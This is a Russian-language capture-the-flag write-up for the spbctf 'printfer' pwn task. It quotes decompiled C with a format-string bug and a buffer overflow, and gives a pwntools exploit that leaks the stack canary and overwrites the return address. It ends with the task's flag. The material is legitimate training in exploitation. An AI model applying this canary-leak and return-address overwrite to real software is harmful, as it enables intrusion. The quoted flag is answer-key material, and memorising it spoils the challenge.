[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn2_printfer)
Описание:
Hi! This is your [binary](https://pwn.spbctf.ru/files/canary/task_printfer)  
nc 109.233.56.90 11589

При помощи уязвимости форматной строки необходимо считать канарейку, а затем переполнить буфер message, переписав адрес возврата.
``` C
unsigned __int64 logic()
{
  _BYTE message[136]; // [rsp+0h] [rbp-90h] BYREF
  unsigned __int64 canary; // [rsp+88h] [rbp-8h]

  canary = __readfsqword(0x28u);

  memset(name, 0, sizeof(name));
  puts("Say your name:");
  read_n(name, 256);
  printf("Welcome, ");
  printf(name);

  puts("!\nNow enter your message:");
  read_n(message, 512);
  puts("Thank you! Your opinion is very important for us!");
  memset(message, 0, 128u);

  return __readfsqword(0x28u) ^ canary;
}
```

При помощи двух вызовов можно определить место нахождение канарейки - 23.
![{E6EB30B0-69BD-419E-B197-8A18F7C0DF82}](../../../../z.%20Images/{E6EB30B0-69BD-419E-B197-8A18F7C0DF82}.png)

Эксплоит:
``` python
io = start()

io.recvuntil(b'Say your name:\n')
io.sendline(b'%23$p')
io.recvuntil(b'Welcome, ')
canary = int(io.recvuntil(b'\n')[:-2], 16)

payload = b'A' * 136 + p64(canary) + b'B' * 8 + p64(0x400885)
io.sendline(payload)

io.interactive()
```

Запуск:
![{6FE12C91-0C86-4608-A7A2-6EDEA6F3BF67}](../../../../z.%20Images/{6FE12C91-0C86-4608-A7A2-6EDEA6F3BF67}.png)

Ответ: `spbctf{d1aa853d26a71d8ca21f771f018a3267235d8359785881a718d6a022ad7c46f0}`